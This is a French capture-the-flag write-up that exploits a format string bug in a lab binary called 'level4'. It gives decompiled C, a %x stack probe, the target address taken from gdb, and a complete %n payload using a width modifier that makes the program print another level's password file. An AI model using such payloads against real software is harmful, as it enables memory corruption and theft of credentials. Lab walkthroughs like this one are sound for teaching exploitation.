# level4

    void p(char *param_1)
    {
        printf(param_1);
        return;
    }

    void n(void)
    {
        char local_20c [520];
        
        fgets(local_20c,0x200,stdin);
        p(local_20c);
        if (m == 0x1025544) {
            system("/bin/cat /home/user/level5/.pass");
        }
        return;
    }

    void main(void)
    {
        n();
        return;
    }





Même faille que level3, `printf` 

`p()` fait juste `printf(argument)` donc exactement le même souci que level3, mais cette fois la variable à atteindre doit valoir `0x1025544` (16930116 en décimal), un nombre bien trop gros pour le bourrer avec des `'B'` un par un comme au level3.

https://www.rapidtables.com/convert/number/hex-to-decimal.html?x=1025544
0x1025544 = 16930116

**Trouver la position de notre buffer dans la pile**

    echo "BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x" | ./level4
    BBBB b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078

`BBBB` apparaît en 12e position cette fois (l'appel imbriqué `n()` → `p()` ajoute des niveaux de pile en plus par rapport à level3). Donc `%12$n`.

**Trouver l'adresse à écraser**

    gdb ./level4
    (gdb) p &m
    $1 = (<data variable, no debug info> *) 0x8049810

    Adresse cible : `0x08049810`.
    https://picoctfsolutions.com/tools/pwntools-payload
    \x10\x98\x04\x08


**Le problème de taille, et l'astuce du champ de largeur**

Écrire `16 930 116` avec `'B' * 16930116` n'est juste pas raisonnable. À la place, on utilise le modificateur de largeur de `%d` : `%<N>d` force `printf` à afficher son argument sur au moins `N` caractères (complété par des espaces) donc `%16930112d` fait sortir exactement 16930112 caractères d'un coup, sans avoir à les écrire un par un.

    16930112 (largeur du %d) + 4 (les octets d'adresse, comptés comme caractères) = 16930116 = 0x1025544

Payload :

    (printf '\x10\x98\x04\x08'; printf '%s' '%16930112d%12$n') > /tmp/payload


injection :

    (cat /tmp/payload; cat -) | ./level4
